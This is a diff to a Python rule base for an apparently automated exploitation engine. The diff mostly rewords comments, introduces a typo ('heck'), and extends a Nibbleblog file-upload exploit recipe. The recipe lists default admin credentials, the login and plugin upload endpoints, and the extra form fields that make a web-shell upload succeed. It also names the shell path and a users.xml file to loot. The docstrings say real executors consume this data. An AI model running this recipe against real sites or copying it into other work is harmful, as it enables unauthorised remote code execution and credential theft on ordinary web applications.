@@ -19,7 +19,7 @@ from typing import Callable
 from core.state import State
 
 # Each rule: (id, name, severity, cost, requires, gives, predicate)
-# `predicate(host, state) -> bool` decides if the rule fires given current observations.
+# `predicate(host, state) -> bool` decides if the rule fires given current observations
 RULES: list[dict] = [
     {
         "id": "VF-UPLOAD-001",
@@ -29,19 +29,30 @@ RULES: list[dict] = [
         "cost": 3,
         "requires": ["/admin", "credential:admin"],
         "gives": ["web_shell", "file_access"],
-        # match as soon as the app is recognized (path signal). cred requirement
-        # is enforced separately via `requires` so try_default_creds can fetch
-        # its recipe before any creds exist
+        # match as soon as the app is recognized (path signal)
+        # cred requirement is enforced separately via `requires` 
+        # so try_default_creds can fetch its recipe before any creds exist
         "predicate": lambda host, state: _path_contains(
             state, host["id"], "nibbleblog"
         ),
-        # exploit recipe — consumed by real executors when this vuln matches
+        # exploit recipe - consumed by real executors when this vuln matches
         "default_credentials": ("admin", "nibbles"),
         "login_endpoint": "/nibbleblog/admin.php",
         "login_payload_keys": ("username", "password"),
         "login_success_indicator": "logout",  # substring expected in response on success
         "upload_endpoint": "/nibbleblog/admin.php?controller=plugins&action=config&plugin=my_image",
         "upload_field_name": "image",
+        # the my_image plugin form has 7 sibling fields besides the file
+        # without them the plugin handler bails silently (POST returns 200 file never lands)
+        "upload_extra_fields": {
+            "plugin": "my_image",
+            "title": "My image",
+            "caption": "",
+            "image_resize": "1",
+            "image_width": "230",
+            "image_height": "200",
+            "image_option": "auto",
+        },
         "shell_path_after_upload": "/nibbleblog/content/private/plugins/my_image/image.php",
         "loot_files": ["/var/www/html/nibbleblog/content/private/users.xml"],
     },
@@ -78,12 +89,15 @@ def _strip_predicate(rule: dict) -> dict:
 
 
 def match_kb(host: dict, state: State) -> list[dict]:
-    """Return KB rules whose predicates fire against current observations."""
+    """
+    Return KB rules whose predicates fire against current observations
+    """
     return [_strip_predicate(rule) for rule in RULES if rule["predicate"](host, state)]
 
 
 def vuln_reqs_met(vuln: dict, paths: set, state: State) -> bool:
-    """Check vuln 'requires' list against observed paths and creds.
+    """
+    heck vuln 'requires' list against observed paths and creds
 
     Path requirements use substring matching so a generic hint like "/admin"
     matches deeper real paths like "/nibbleblog/admin.php".
@@ -112,12 +126,15 @@ def vulns_for(host: dict, state: State) -> list[dict]:
 
 
 def recipe_for(host: dict, state: State, capability: str) -> dict | None:
-    """Return the first matched vuln on this host whose `gives` includes capability.
+    """
+    Return the first matched vuln on this host whose `gives` includes capability
 
-    Real executors call this to fetch app-specific exploit data (login URLs,
-    upload endpoints, default creds, loot file paths). Returns None if no
-    matched vuln offers the capability — caller should treat that as a recipe
-    miss and fail with error='recipe_missing'.
+    Real executors call this to fetch app specific exploit data 
+    like (login URLs, upload endpoints, default creds, loot file paths)
+    
+    Returns None if no matched vuln offers the capability
+    The caller should treat that as a recipe
+    miss and fail with error='recipe_missing'
     """
     for vuln in vulns_for(host, state):
         if capability in vuln.get("gives", []):
